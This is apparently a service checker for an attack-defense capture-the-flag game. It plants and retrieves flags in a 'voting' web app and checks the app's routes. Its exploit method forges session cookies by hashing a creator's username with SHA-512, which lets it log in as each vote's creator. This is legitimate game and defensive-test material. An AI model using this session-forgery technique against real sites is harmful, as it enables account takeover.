from enochecker import *
import secrets
import random
import string
import urllib
import hashlib
import requests

def generate_content(amount):
    return "".join(random.choice(string.ascii_letters + string.digits + " ") for _ in range(amount))

def generate_content_no_whitespace(amount):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(amount))

class VotingChecker(BaseChecker):
    port = 80
    flag_count = 1
    noise_count = 1
    havoc_count = 1
    service_name = "voting"

    def putflag(self) -> None:

        # TODO generate fake user content
        user = generate_content_no_whitespace(random.randint(8, 32))
        password = secrets.token_hex(24)
        title = generate_content(random.randint(5, 48))
        description = generate_content(random.randint(6, 128))

        # register
        for i in range(6):  # try to find an unique username up to 5 times
            if i == 5:
                raise BrokenServiceException("usernames already used")

            response = self.http_post(route="/register.html", data={"user": user, "password": password},
                                      allow_redirects=False)

            if response.status_code != 302:
                if "Username already exists" in response.text:
                    user = generate_content_no_whitespace(random.randint(8, 32))
                else:
                    raise BrokenServiceException("registration is broken")
            else:
                break

        # create vote
        response = self.http_post(route="/create.html",
                                  data={"title": title, "description": description, "notes": self.flag},
                                  allow_redirects=False)

        assert_equals(302, response.status_code, "create is broken")

        try:
            response_query = urllib.parse.parse_qs(urllib.parse.urlparse(response.headers["Location"]).query,
                                                   strict_parsing=True)
            vote_id = int(response_query.get("v")[0])
        except Exception:
            raise BrokenServiceException("create redirects wrong")

        self.team_db[self.flag] = (vote_id, user, password)

    def getflag(self) -> None:

        try:
            (vote_id, user, password) = self.team_db[self.flag]
        except KeyError:
            return Result.MUMBLE

        # login
        response = self.http_post(route="/login.html", data={"user": user, "password": password}, allow_redirects=False)

        assert_equals(302, response.status_code, "login failed")

        # get vote
        response = self.http_get(route="/vote.html", params={"v": vote_id})

        assert_equals(200, response.status_code, "get vote failed")
        assert_in(self.flag, response.text, "flag not found")

    def putnoise(self) -> None:

        # TODO generate fake user content
        user = generate_content_no_whitespace(random.randint(8, 32))
        password = secrets.token_hex(24)
        title = generate_content(random.randint(5, 48))

        # register
        for i in range(6):  # try to find an unique username up to 5 times
            if i == 5:
                raise BrokenServiceException("usernames already used")

            response = self.http_post(route="/register.html", data={"user": user, "password": password},
                                      allow_redirects=False)

            if response.status_code != 302:
                if "Username already exists" in response.text:
                    user = generate_content_no_whitespace(random.randint(8, 32))
                else:
                    raise BrokenServiceException("registration is broken")
            else:
                break

        # create vote
        response = self.http_post(route="/create.html",
                                  data={"title": title, "description": self.flag, "notes": ""},
                                  allow_redirects=False)

        assert_equals(302, response.status_code, "create is broken")

        try:
            response_query = urllib.parse.parse_qs(urllib.parse.urlparse(response.headers["Location"]).query,
                                                   strict_parsing=True)
            vote_id = int(response_query.get("v")[0])
        except Exception:
            raise BrokenServiceException("create redirects wrong")

        self.team_db[self.flag + str(self.flag_idx)] = vote_id

    def getnoise(self) -> None:

        try:
            vote_id = self.team_db[self.flag + str(self.flag_idx)]
        except KeyError:
            return Result.MUMBLE

        # get vote
        response = self.http_get(route="/vote.html", params={"v": vote_id})

        assert_equals(200, response.status_code, "get vote failed")
        assert_in(self.flag, response.text, "noise not found")

    def havoc(self) -> None:

        # check "/" returns a permanent redirect to "/index.html"
        response = self.http_get(route="/", allow_redirects=False)
        assert_equals(301, response.status_code, "'/' broken")
        assert_equals("/index.html", urllib.parse.urlparse(response.headers["Location"]).path, "'/' broken")

        # check "/index.html"
        response = self.http_get(route="/index.html", allow_redirects=False)
        assert_equals(200, response.status_code, "'/index.html' broken")

        # check "/vote.html" for most recent vote found (if any)
        vote_link_start = response.text.find('href="/vote.html?v=')
        if vote_link_start > 0:
            vote_link_end = response.text.find('"', vote_link_start + len('href="/vote.html?v='))
            vote_id = response.text[vote_link_start + len('href="/vote.html?v='):vote_link_end]

            self.info("Parsed vote id: {}".format(vote_id))

            # check most recent vote reachable
            response = self.http_get(route="/vote.html", params={"v": vote_id}, allow_redirects=False)
            assert_equals(200, response.status_code, "'/vote.html' broken")

            # check vote created by
            user_start = response.text.find("<p>Vote created by: ")
            if user_start > 0:
                user_end = response.text.find("</p>", user_start + len("<p>Vote created by: "))
                parsed_user = response.text[user_start + len("<p>Vote created by: "):user_end]

                self.info("Parsed user: {}".format(parsed_user))
            else:
                raise BrokenServiceException("'/vote.html' created by broken")

        # check "/login.html" reachable
        response = self.http_get(route="/login.html", allow_redirects=False)
        assert_equals(200, response.status_code, "'/login.html' broken")

        # check "/register.html" reachable
        response = self.http_get(route="/register.html", allow_redirects=False)
        assert_equals(200, response.status_code, "'/register.html' broken")

        # register
        # TODO generate fake user content
        user = generate_content_no_whitespace(random.randint(8, 32))
        password = secrets.token_hex(24)

        for i in range(6):  # try to find an unique username up to 5 times
            if i == 5:
                raise BrokenServiceException("usernames already used")

            response = self.http_post(route="/register.html", data={"user": user, "password": password},
                                      allow_redirects=False)

            if response.status_code != 302:
                if "Username already exists" in response.text:
                    user = generate_content_no_whitespace(random.randint(8, 32))
                else:
                    raise BrokenServiceException("registration is broken")
            else:
                break

        # check auth'ed "/index.html"
        response = self.http_get(route="/index.html", allow_redirects=False)
        assert_equals(200, response.status_code, "'/index.html' broken")
        assert_in("<span>Welcome, {}!</span>".format(user), response.text, "'/index.html' broken")

        # logout
        response = self.http_post(route="/logout.html", allow_redirects=False)
        assert_equals(302, response.status_code, "'/logout.html' broken")
        assert_equals("/index.html", urllib.parse.urlparse(response.headers["Location"]).path, "'/logout.html' broken")

        response = self.http_get(route="/index.html", allow_redirects=False)
        assert_equals(200, response.status_code, "'/index.html' broken")
        if "<span>Welcome, {}!</span>".format(user) in response.text:
            raise BrokenServiceException("'/index.html' broken")

        # login again
        response = self.http_post(route="/login.html", data={"user": user, "password": password},
                                      allow_redirects=False)
        assert_equals(302, response.status_code, "'login' broken")
        assert_equals("/index.html", urllib.parse.urlparse(response.headers["Location"]).path, "'/login.html' redirect broken")

        # check auth'ed "/index.html"
        response = self.http_get(route="/index.html", allow_redirects=False)
        assert_equals(200, response.status_code, "'/index.html' broken")
        assert_in("<span>Welcome, {}!</span>".format(user), response.text, "'/index.html' broken")

        # check "/create.html" reachable
        response = self.http_get(route="/create.html", allow_redirects=False)
        assert_equals(200, response.status_code, "'/create.html' broken")

        # create a vote
        # TODO generate fake user content
        title = generate_content(random.randint(5, 48))
        description = generate_content(random.randint(6, 128))
        notes = generate_content(random.randint(6, 48))

        response = self.http_post(route="/create.html", data={"title": title, "description": description, "notes": notes},
                                  allow_redirects=False)
        assert_equals(302, response.status_code, "'/create.html' is broken")

        vote_location = urllib.parse.urlparse(response.headers["Location"])
        assert_equals("/vote.html", vote_location.path, "'/vote.html' is broken (GET)")

        try:
            response_query = urllib.parse.parse_qs(vote_location.query, strict_parsing=True)
            vote_id = int(response_query.get("v")[0])
        except Exception:
            raise BrokenServiceException("'/create.html' redirects wrong")

        # check vote created
        response = self.http_get(route="/vote.html?v={}".format(vote_id), allow_redirects=False)
        assert_equals(200, response.status_code, "'/vote.html' is broken (GET)")
        assert_in(title, response.text, "'/vote.html' don't contain title")
        assert_in(description, response.text, "'/vote.html' don't contain description")
        assert_in(notes, response.text, "'/vote.html' don't contain notes")
        assert_in("<p>Vote created by: {}</p>".format(user), response.text, "'/vote.html' don't contain user created by")

        # vote yes
        response = self.http_post(route="/vote.html?v={}".format(vote_id), data={"vote": "Yes"}, allow_redirects=False)
        assert_equals(302, response.status_code, "'/vote.html' is broken (POST)")
        assert_equals(vote_location.path, urllib.parse.urlparse(response.headers["Location"]).path, "'/vote.html' is broken (POST)")

    def exploit(self) -> None:

        vote_id = 1
        response = self.http_get(route="/vote.html?v={}".format(vote_id), allow_redirects=False)

        # status code turns into 404 if we reach unused vote ids
        while (response.status_code == 200):
            # parse user created the vote
            user_start = response.text.find("<p>Vote created by: ")
            user_end = response.text.find("</p>", user_start + len("<p>Vote created by: "))
            parsed_user = response.text[user_start + len("<p>Vote created by: "):user_end]
            self.info("Parsed user: {}".format(parsed_user))

            # the exploid: 'login' as the parsed user
            h = hashlib.sha512()
            h.update(str.encode(parsed_user))
            sid = h.hexdigest()
            
            requests.utils.add_dict_to_cookiejar(self.http_session.cookies, {"session": sid})

            # request the vote as the creator to check success
            response = self.http_get(route="/vote.html?v={}".format(vote_id), allow_redirects=False)

            if "<span>Welcome, {}!</span>".format(parsed_user) not in response.text:
                # this could happen due to a fix of the vulnerability
                # or if the creator logged out or the session expired
                self.info("Could not exploid vote {}.".format(vote_id))
            else:
                self.info("Successfully exploided vote {}.".format(vote_id))

            requests.utils.add_dict_to_cookiejar(self.http_session.cookies, {"session": None})

            # request next possible vote
            vote_id += 1
            response = self.http_get(route="/vote.html?v={}".format(vote_id), allow_redirects=False)

app = VotingChecker.service

if __name__ == "__main__":
    run(VotingChecker)
